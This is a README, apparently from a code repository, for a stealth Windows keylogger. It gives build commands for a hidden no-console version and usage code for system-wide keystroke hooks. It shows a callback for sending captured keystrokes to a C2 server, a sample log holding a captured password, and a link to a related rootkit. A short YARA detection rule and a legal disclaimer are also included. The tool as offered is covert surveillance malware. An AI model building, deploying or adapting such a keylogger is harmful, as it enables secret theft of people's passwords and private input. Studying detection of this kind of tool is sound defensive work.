# Stealth Keylogger

A Windows keylogger that uses low-level hooks to capture keystrokes system-wide. Built for security research and pentesting.

## What it does

Captures every keystroke on a Windows system, including special characters and unicode. It tracks which window is active and logs everything to a file in the temp directory with a random name.

The hook works at the lowest level (WH_KEYBOARD_LL) so it catches everything before applications see it. Right-click or press Enter to flush the buffer immediately.

## Building

You need MinGW-w64 or any modern C++ compiler on Windows.

Debug version (shows console):
```
g++ -o keylogger_debug.exe main.cpp -std=c++17 -Wall -Wextra -O2 -static
```

Release version (no console, runs hidden):
```
g++ -o keylogger.exe main.cpp -std=c++17 -Wall -Wextra -O2 -static -mwindows
```

Or just use the PowerShell script:
```
.\build.ps1 -Mode Release
```

## How to use

The main.cpp file has a complete example. Basically:

```cpp
#include "Keylogger.h"

// Start capturing
Keylogger::Start(nullptr, true);

// Keep it running
MSG msg;
while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
}

// Clean stop
Keylogger::Stop();
```

If you want to send data to a C2 server instead of just logging to a file, pass a callback function:

```cpp
void SendToServer(const wstring& data) {
    // Your HTTP POST or whatever
}

Keylogger::Start(SendToServer, true);
```

## Log files

Logs are saved in %TEMP% with random 8-char hex names like `3f8a9b2c.tmp`. Format looks like:

```
========================================
Session Started
Date: 2025-12-24 15:30:22
========================================

[15:30:25] [Chrome - github.com]
git clone https://github.com/whatever

[15:31:10] [Notepad - passwords.txt]
admin:P@ssw0rd123

========================================
Session Ended  
Date: 2025-12-24 15:45:00
========================================
```

## Technical details

- Uses SetWindowsHookExW with WH_KEYBOARD_LL for keyboard
- WH_MOUSE_LL hook detects right-clicks (triggers immediate send)
- ToUnicodeEx handles unicode properly (accents, symbols, AltGr combos)
- Thread-safe buffer with mutex
- Tracks active window with GetForegroundWindow
- No admin rights needed

## Detection

EDRs will catch this easily if they monitor:
- SetWindowsHookExW API calls
- WH_KEYBOARD_LL hook registrations
- Suspicious .tmp files in temp directory
- Network connections with keystroke patterns

Basic YARA rule:
```yara
rule Basic_Keylogger {
    strings:
        $a = "SetWindowsHookExW"
        $b = "WH_KEYBOARD_LL"
    condition:
        all of them
}
```

## Legal stuff

This is for authorized security testing only. Don't be stupid. Using this without permission is illegal in pretty much every country. I'm not responsible if you do something dumb with it.

If you're doing red team work, make sure you have written authorization. If you're learning, keep it in a VM.

## Contact

Questions or bugs? Open an issue or email 28zaakypro@proton.me

## Related

This keylogger is extracted from the full rootkit project:
https://github.com/28Zaaky/Usermode-Rootkit

---

Made for educational and authorized security research purposes.
